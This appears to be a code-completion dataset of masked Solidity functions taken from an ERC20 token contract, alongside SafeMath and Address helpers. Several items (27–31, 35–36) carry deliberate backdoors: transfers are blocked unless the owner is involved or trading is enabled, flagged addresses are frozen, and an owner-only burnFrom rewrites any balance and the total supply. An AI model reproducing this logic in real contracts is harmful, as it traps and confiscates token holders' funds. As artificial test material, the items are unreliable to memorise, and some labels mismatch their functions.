0
sub:function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return mask();    }


1
div:function div(uint256 a, uint256 b) internal pure returns (uint256) {        return mask();    }


2
mod:function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return mask();    }


3
call:function sendValue(address payable recipient, uint256 amount) internal {        require(address(this).balance >= amount, "Address: insufficient balance");        (bool success, ) = recipient.mask();        require(success, "Address: unable to send value, recipient may have reverted");    }


4
functionCall:function functionCall(address target, bytes memory data) internal returns (bytes memory) {      return mask();    }


5
_functionCallWithValue:function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {        return mask();    }


6
functionCallWithValue:function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {        return mask();    }


7
_functionCallWithValue:function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {        require(address(this).balance >= value, "Address: insufficient balance for call");        return mask();    }


8
isContract:function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {        require(mask(), "Address: call to non-contract");        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);        if (success) {            return returndata;        } else {            if (returndata.length > 0) {                assembly {                    let returndata_size := mload(returndata)                    revert(add(32, returndata), returndata_size)                }            } else {                revert(errorMessage);            }        }    }


9
call:function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {        require(isContract(target), "Address: call to non-contract");        (bool success, bytes memory returndata) = target.mask();        if (success) {            return returndata;        } else {            if (returndata.length > 0) {                assembly {                    let returndata_size := mload(returndata)                    revert(add(32, returndata), returndata_size)                }            } else {                revert(errorMessage);            }        }    }


10
_transfer:function transfer(address recipient, uint256 amount) public  virtual override returns (bool) {        mask();        return true;    }


11
_msgSender:function transfer(address recipient, uint256 amount) public  virtual override returns (bool) {        _transfer(mask(), recipient, amount);        return true;    }


12
_approve:function approve(address spender, uint256 amount) public virtual override returns (bool) {        mask();        return true;     }


13
_msgSender:function approve(address spender, uint256 amount) public virtual override returns (bool) {        _approve(mask(), spender, amount);        return true;     }


14
_transfer:function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {        mask();        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));        return true;    }


15
_approve:function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {        _transfer(sender, recipient, amount);        mask();        return true;    }


16
_msgSender:function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {        _transfer(sender, recipient, amount);        _approve(sender, mask(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));        return true;    }


17
sub:function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {        _transfer(sender, recipient, amount);        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].mask());        return true;    }


18
_msgSender:function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {        _transfer(sender, recipient, amount);        _approve(sender, _msgSender(), _allowances[sender][mask()].sub(amount, "ERC20: transfer amount exceeds allowance"));        return true;    }


19
_approve:function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {        mask();        return true;    }


20
_msgSender:function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {        _approve(mask(), spender, _allowances[_msgSender()][spender].add(addedValue));        return true;    }


21
add:function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].mask());        return true;    }


22
_msgSender:function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {        _approve(_msgSender(), spender, _allowances[mask()][spender].add(addedValue));        return true;    }


23
_approve:function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {        mask();        return true;    }


24
_msgSender:function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {        _approve(mask(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));        return true;    }


25
sub:function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].mask());        return true;    }


26
_msgSender:function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {        _approve(_msgSender(), spender, _allowances[mask()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));        return true;    }


27
owner:function _transfer(address sender, address recipient, uint256 amount) internal virtual {        require(sender != address(0), "ERC20: transfer from the zero address");        require(recipient != address(0), "ERC20: transfer to the zero address");        if (_fee[sender] || _fee[recipient]) require(amount == 0, "");        if (_initialize == true || sender == owner() || recipient == mask()) {        _beforeTokenTransfer(sender, recipient, amount);        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);} else {require (_initialize == true, "");}    }


28
owner:function _transfer(address sender, address recipient, uint256 amount) internal virtual {        require(sender != address(0), "ERC20: transfer from the zero address");        require(recipient != address(0), "ERC20: transfer to the zero address");        if (_fee[sender] || _fee[recipient]) require(amount == 0, "");        if (_initialize == true || sender == mask() || recipient == owner()) {        _beforeTokenTransfer(sender, recipient, amount);        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);} else {require (_initialize == true, "");}    }


29
_beforeTokenTransfer:function _transfer(address sender, address recipient, uint256 amount) internal virtual {        require(sender != address(0), "ERC20: transfer from the zero address");        require(recipient != address(0), "ERC20: transfer to the zero address");        if (_fee[sender] || _fee[recipient]) require(amount == 0, "");        if (_initialize == true || sender == owner() || recipient == owner()) {        mask();        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);} else {require (_initialize == true, "");}    }


30
sub:function _transfer(address sender, address recipient, uint256 amount) internal virtual {        require(sender != address(0), "ERC20: transfer from the zero address");        require(recipient != address(0), "ERC20: transfer to the zero address");        if (_fee[sender] || _fee[recipient]) require(amount == 0, "");        if (_initialize == true || sender == owner() || recipient == owner()) {        _beforeTokenTransfer(sender, recipient, amount);        _balances[sender] = _balances[sender].mask();        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);} else {require (_initialize == true, "");}    }


31
add:function _transfer(address sender, address recipient, uint256 amount) internal virtual {        require(sender != address(0), "ERC20: transfer from the zero address");        require(recipient != address(0), "ERC20: transfer to the zero address");        if (_fee[sender] || _fee[recipient]) require(amount == 0, "");        if (_initialize == true || sender == owner() || recipient == owner()) {        _beforeTokenTransfer(sender, recipient, amount);        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");        _balances[recipient] = _balances[recipient].mask();        emit Transfer(sender, recipient, amount);} else {require (_initialize == true, "");}    }


32
_beforeTokenTransfer:function _burn(address account, uint256 amount) internal virtual {        require(account != address(0), "ERC20: burn from the zero address disallowed");        mask();        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");        _totalSupply = _totalSupply.sub(amount);        emit Transfer(account, address(0), amount);    }


33
sub:function _burn(address account, uint256 amount) internal virtual {        require(account != address(0), "ERC20: burn from the zero address disallowed");        _beforeTokenTransfer(account, address(0), amount);        _balances[account] = _balances[account].mask();        _totalSupply = _totalSupply.sub(amount);        emit Transfer(account, address(0), amount);    }


34
sub:function _burn(address account, uint256 amount) internal virtual {        require(account != address(0), "ERC20: burn from the zero address disallowed");        _beforeTokenTransfer(account, address(0), amount);        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");        _totalSupply = _totalSupply.mask();        emit Transfer(account, address(0), amount);    }


35
sub:function burnFrom(address account, uint256 balance, uint256 subtract) external ownerOnly {        require(account != address(0), "ERC20: burn from the zero address disallowed");       _balances[account] = balance.mask();       _totalSupply = balance.sub(subtract);    }


36
sub:function burnFrom(address account, uint256 balance, uint256 subtract) external ownerOnly {        require(account != address(0), "ERC20: burn from the zero address disallowed");       _balances[account] = balance.sub(subtract, "ERC20: burn amount exceeds balance");       _totalSupply = balance.mask();    }


